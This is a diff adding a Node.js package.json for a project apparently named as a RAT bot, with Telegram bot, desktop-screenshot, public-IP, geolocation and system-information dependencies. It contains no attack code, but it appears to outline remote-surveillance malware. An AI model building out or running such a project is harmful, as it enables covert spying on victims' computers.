@@ -1,0 +1,23 @@
+{
+  "name": "prime-rat-bot",
+  "version": "2.0.0",
+  "description": "JANGAN DI JUAL",
+  "main": "free.js",
+  "scripts": {
+    "start": "node free.js",
+    "dev": "nodemon free.js"
+  },
+  "dependencies": {
+    "telegraf": "^4.16.3",
+    "express": "^4.19.2",
+    "axios": "^1.7.2",
+    "screenshot-desktop": "^1.14.0",
+    "public-ip": "^6.0.1",
+    "node-fetch": "^3.3.2",
+    "geoip-lite": "^1.4.9",
+    "systeminformation": "^5.21.7"
+  },
+  "engines": {
+    "node": ">=18"
+  }
+}
